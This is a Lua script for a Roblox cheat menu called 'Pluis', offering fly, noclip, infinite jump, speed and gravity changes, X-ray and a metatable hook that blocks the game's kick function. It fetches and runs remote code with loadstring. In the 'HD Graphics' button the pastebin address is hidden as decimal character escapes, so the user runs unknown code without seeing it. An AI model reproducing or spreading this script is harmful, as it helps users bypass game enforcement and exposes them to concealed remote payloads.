local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/NorthPluis/Pluis/main/UI%20Source'))()

local Window = Library:CreateWindow('Pluis | Beta','Universal','Pluis Beta', 'rbxassetid://10618928818', false, 'VisualUIConfigs', 'Default')


    Library:CreatePrompt('OneButton', 'Pluis', 'Remember, This is in beta so expect Bugs', {
    'Alright',
    function()
        print('Prompt Button Pressed')
    end
})

--Other tings
local client = game.Players.LocalPlayer
local char = client.Character

--inf 
local noclip = false
local infjumpenabled = false

game:GetService("RunService").RenderStepped:Connect(function()
    if noclip == true then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
    end
end)

game:GetService("UserInputService").JumpRequest:Connect(function()
	if infjumpenabled then
		game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState("Jumping")
	end
end)




--Universal Tab
local UniversalTab = Window:CreateTab('Universal', true, 'rbxassetid://3926305904', Vector2.new(484, 44), Vector2.new(36, 36))


--Player Section
local PlayerSection = UniversalTab:CreateSection('Player')


local Button = PlayerSection:CreateButton('Break Joints', function()
local player = game.Players.LocalPlayer.Name
game.workspace[player]:BreakJoints()
end)

local Button = PlayerSection:CreateButton('Reset Character', function()
local playerrr = game.Players.LocalPlayer
local nameofplayerrr = player.Character.Name
print(nameofplayerrr)
game.Workspace[nameofplayerrr].Humanoid.Health = 0
warn("Player Reset!")
end)

local Toggle = PlayerSection:CreateToggle('noclip', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
	noclip = Value
end)

local Toggle = PlayerSection:CreateToggle('Inf Jump', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
	infjumpenabled = Value
end)






Fly = false    
      function activatefly()
         local mouse=game.Players.LocalPlayer:GetMouse''
         localplayer=game.Players.LocalPlayer
         game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
         local torso = game.Players.LocalPlayer.Character.HumanoidRootPart
         local speed=150
         local keys={a=false,d=false,w=false,s=false}
         local e1
         local e2
         local function start()
            local pos = Instance.new("BodyPosition",torso)
            local gyro = Instance.new("BodyGyro",torso)
            pos.Name="EPIXPOS"
            pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
            pos.position = torso.Position
            gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            gyro.cframe = torso.CFrame
            repeat
                  wait()
                  localplayer.Character.Humanoid.PlatformStand=true
                  local new=gyro.cframe - gyro.cframe.p + pos.position
                  if not keys.w and not keys.s and not keys.a and not keys.d then
                     speed=1
                  end
                  if keys.w then
                     new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                     speed=speed+0.02
                  end
                  if keys.s then
                     new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
                     speed=speed+0.02
                  end
                  if keys.d then
                     new = new * CFrame.new(speed,0,0)
                     speed=speed+0.02
                  end
                  if keys.a then
                     new = new * CFrame.new(-speed,0,0)
                     speed=speed+0.02
                  end
                  if speed>5 then
                     speed=5.5
                  end
                  pos.position=new.p
                  if keys.w then
                     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*15),0,0)
                  elseif keys.s then
                     gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*15),0,0)
                  else
                     gyro.cframe = workspace.CurrentCamera.CoordinateFrame
                  end
            until not Fly
            if gyro then 
                  gyro:Destroy() 
            end
            if pos then 
                  pos:Destroy() 
            end
            flying=false
            localplayer.Character.Humanoid.PlatformStand=false
            speed=0
         end
         e1=mouse.KeyDown:connect(function(key)
            if not torso or not torso.Parent then 
                  flying=false e1:disconnect() e2:disconnect() return 
            end
            if key=="w" then
                  keys.w=true
            elseif key=="s" then
                  keys.s=true
            elseif key=="a" then
                  keys.a=true
            elseif key=="d" then
                  keys.d=true
            end
         end)
         e2=mouse.KeyUp:connect(function(key)
            if key=="w" then
                  keys.w=false
            elseif key=="s" then
                  keys.s=false
            elseif key=="a" then
                  keys.a=false
            elseif key=="d" then
                  keys.d=false
            end
         end)
         start()
      end

local Toggle = PlayerSection:CreateToggle('Fly', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
	Fly = Value
         activatefly()
end)

local Button = PlayerSection:CreateButton('Anti-AFK', function()
    local hook = game:GetService("Players").LocalPlayer.Kick;
local mt = getrawmetatable(game:GetService("Players").LocalPlayer)
local OldNamecall = mt.__namecall
local OldIndex = mt.__index

Library:CreateNotification('Pluis', 'Anti-AFK Enabled', 5)

make_writeable(mt)
mt.__namecall = newcclosure(function(self, Index, ...)
    local NameCallMethod = getnamecallmethod()
    if type(NameCallMethod) == "string" then
        if NameCallMethod == "Kick" or NameCallMethod == "kick" then
            print("Prevented Kick At " .. tostring(os.time()))
            return function()end
        end
    end
    return OldNamecall(self, Index, ...)
end)

mt.__index = newcclosure(function(self, Index, ...)
    if type(Index) == "string" then
        if Index == "Kick" or Index == "kick" then
            print("Prevented Kick At " .. tostring(os.time()))
            return function()end
        end
    end
    return OldIndex(self, Index, ...)
end)
make_readonly(mt)
end)

local Slider = PlayerSection:CreateSlider('Walkspeed', 1, 100, 16, Color3.fromRGB(0, 125, 255), function(Value)
	game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Value
end)

local Slider = PlayerSection:CreateSlider('Jump power', 1, 100, 30, Color3.fromRGB(0, 125, 255), function(Value)
	game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
end)

local Slider = PlayerSection:CreateSlider('Gravity', 1, 100, 100, Color3.fromRGB(0, 125, 255), function(Value)
    workspace.Gravity = Value
end)

--Game Settings Section
local Universal = UniversalTab:CreateSection('Game Settings')



local Button = Universal:CreateButton('Rejoin Game', function()
Library:CreateNotification('Pluis', 'Rejoining Current Game', 2)
wait(2)

local ts = game:GetService("TeleportService")
local p = game:GetService("Players").LocalPlayer

ts:Teleport(game.PlaceId, p)  
end)

local Button = Universal:CreateButton('FPS Booster', function()
Library:CreateNotification('Pluis', 'Enjoy your Extra FPS (Rejoin to revert)', 4)

wait(4)
local removedecals = false
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and removedecals then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
end)


local Button = Universal:CreateButton('HD Graphics', function()
Library:CreateNotification('Pluis', 'This will work on most games', 4)
_G.BlurSize = 1

_G.ColorCorrectionBrightness = 0.03
_G.ColorCorrectionContrast = 0.3
_G.ColorCorrectionSaturation = 0.01
_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)

_G.SunRaysIntensity = 0.2
_G.SunRaysSpread = 1

-- Lighting settings:
_G.GlobalShadows = true
_G.Brightness = 0.9
_G.GeographicLatitude = 350
_G.TimeOfDay = 17
_G.ExposureCompensation = 0.03


spawn(function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
end)
end)

--FOV Section
local FOVSection = UniversalTab:CreateSection('Field Of View')

local Button = FOVSection:CreateButton('Reset FOV', function()


game:GetService'Workspace'.Camera.FieldOfView = 80
end)

local FOVSlider = FOVSection:CreateSlider('FOV', 0, 120, 80, Color3.fromRGB(0, 125, 255), function(Value)
    game:GetService'Workspace'.Camera.FieldOfView = Value
end)

--Visual Section
local VisualSection = UniversalTab:CreateSection('Visual')


local Toggle = VisualSection:CreateToggle('X-Ray', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
    if Value then
        for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not v.Parent.Parent:FindFirstChild("Humanoid") then
				v.Transparency = v.Transparency + 0.5
			end
		end
    else
        for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not v.Parent.Parent:FindFirstChild("Humanoid") then
				v.Transparency = v.Transparency - 0.5
			end
		end
    end
end)


local Toggle = VisualSection:CreateToggle('Fullbright', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
if not _G.FullBrightExecuted then

	_G.FullBrightEnabled = false

	_G.NormalLightingSettings = {
		Brightness = game:GetService("Lighting").Brightness,
		ClockTime = game:GetService("Lighting").ClockTime,
		FogEnd = game:GetService("Lighting").FogEnd,
		GlobalShadows = game:GetService("Lighting").GlobalShadows,
		Ambient = game:GetService("Lighting").Ambient
	}

	game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
		if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
			_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").Brightness = 1
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
		if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
			_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").ClockTime = 12
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
		if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
			_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").FogEnd = 786543
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
		if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
			_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").GlobalShadows = false
		end
	end)

	game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
		if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
			_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
			if not _G.FullBrightEnabled then
				repeat
					wait()
				until _G.FullBrightEnabled
			end
			game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
		end
	end)

	game:GetService("Lighting").Brightness = 1
	game:GetService("Lighting").ClockTime = 12
	game:GetService("Lighting").FogEnd = 786543
	game:GetService("Lighting").GlobalShadows = false
	game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)

	local LatestValue = true
	spawn(function()
		repeat
			wait()
		until _G.FullBrightEnabled
		while wait() do
			if _G.FullBrightEnabled ~= LatestValue then
				if not _G.FullBrightEnabled then
					game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
					game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
					game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
					game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
					game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
				else
					game:GetService("Lighting").Brightness = 1
					game:GetService("Lighting").ClockTime = 12
					game:GetService("Lighting").FogEnd = 786543
					game:GetService("Lighting").GlobalShadows = false
					game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
				end
				LatestValue = not LatestValue
			end
		end
	end)
end

_G.FullBrightExecuted = Value
_G.FullBrightEnabled = not _G.FullBrightEnabled
end)




--Settings Tab

local Settings = Window:CreateTab('Settings', false, 'rbxassetid://3926305904', Vector2.new(484, 44), Vector2.new(36, 36))

local UISettings = Settings:CreateSection('UI Functions')

local DestroyButton = UISettings:CreateButton('Destroy UI', function()
    Library:DestroyUI()
end)

local ToggleKeybind = UISettings:CreateKeybind('Toggle UI', 'E', function()
    Library:ToggleUI()
end)


local TransparencySlider = UISettings:CreateSlider('Transparency', 0, 100, 0, Color3.fromRGB(0, 125, 255), function(Value)
    Library:SetTransparency(Value / 100, true)
end)




--Config Tab
local ConfigTab = Window:CreateTab('Config', false, 'rbxassetid://3926305904', Vector2.new(484, 44), Vector2.new(36, 36))


local ConfigSection = ConfigTab:CreateSection('Config')

local ConfigNameString = ''
local ConfigName = ConfigSection:CreateTextbox('Config Name', 'Input', function(Value)
    ConfigNameString = Value
end)

local SaveConfigButton = ConfigSection:CreateButton('Save Config', function()
    Library:SaveConfig(ConfigNameString)
end)

local SelectedConfig = ''
local ConfigsDropdown = ConfigSection:CreateDropdown('Configs', Library:GetConfigs(), nil, 0.25, function(Value)
    SelectedConfig = Value
end)

local DeleteConfigButton = ConfigSection:CreateButton('Delete Config', function()
    Library:DeleteConfig(SelectedConfig)
end)

local LoadConfigButton = ConfigSection:CreateButton('Load Config', function()
    Library:LoadConfig(SelectedConfig)
end)

local RefreshConfigsButton = ConfigSection:CreateButton('Refresh', function()
    ConfigsDropdown:UpdateDropdown(Library:GetConfigs())
end)



--Themes Tab
local ThemesTab = Window:CreateTab('Themes', false, 'rbxassetid://3926305904', Vector2.new(484, 44), Vector2.new(36, 36))

local ThemesSection = ThemesTab:CreateSection('Themes')

local ThemesDropdown = ThemesSection:CreateDropdown('Themes', Library:GetThemes(), nil, 0.25, function(Value)
    Library:ChangeTheme(Value)
end)

local ColorSection = ThemesTab:CreateSection('Custom Colors')

for Index, CurrentColor in next, Library:ReturnTheme() do
    ColorSection:CreateColorpicker(Index, CurrentColor, 0.25, function(Color)
        Library:ChangeColor(Index, Color)
    end, {true})
end
